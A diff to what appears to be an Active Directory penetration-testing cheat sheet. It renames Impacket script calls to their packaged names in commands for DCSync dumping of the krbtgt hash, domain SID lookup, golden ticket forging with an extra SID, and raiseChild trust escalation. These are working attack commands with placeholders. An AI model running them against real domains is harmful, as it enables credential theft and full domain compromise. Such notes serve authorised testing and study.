@@ -389,13 +389,13 @@ Individually...
 
 ```bash
 # Performing DCSync with secretsdump.py
-secretsdump.py <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -just-dc-user <TARGET_DOMAIN>/krbtgt
+impacket-secretsdump <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -just-dc-user <TARGET_DOMAIN>/krbtgt
 
 # Domain SID
-lookupsid.py <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> | grep "Domain SID"
+impacket-lookupsid <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> | grep "Domain SID"
 
 # GOLDEN TICKET attack
-ticketer.py -nthash <KRBTGT_HASH> -domain <TARGET_DOMAIN> -domain-sid <TARGET_DOMAIN_SID> -extra-sid <TARGET_SID> <USER>
+impacket-ticketer -nthash <KRBTGT_HASH> -domain <TARGET_DOMAIN> -domain-sid <TARGET_DOMAIN_SID> -extra-sid <TARGET_SID> <USER>
 export KRB5CCNAME="$(pwd)/<USER>.ccache"
 
 # !!! use something like psexec to access !!!
@@ -405,7 +405,7 @@ export KRB5CCNAME="$(pwd)/<USER>.ccache"
 
 ```bash
 # NOTE: will prompt for password
-raiseChild.py -target-exec <DC_IP> <TARGET_DOMAIN>/<USER>
+impacket-raiseChild -target-exec <DC_IP> <TARGET_DOMAIN>/<USER>
 
 # can use administrator hash from output to secretsdump.py for a user
 ```
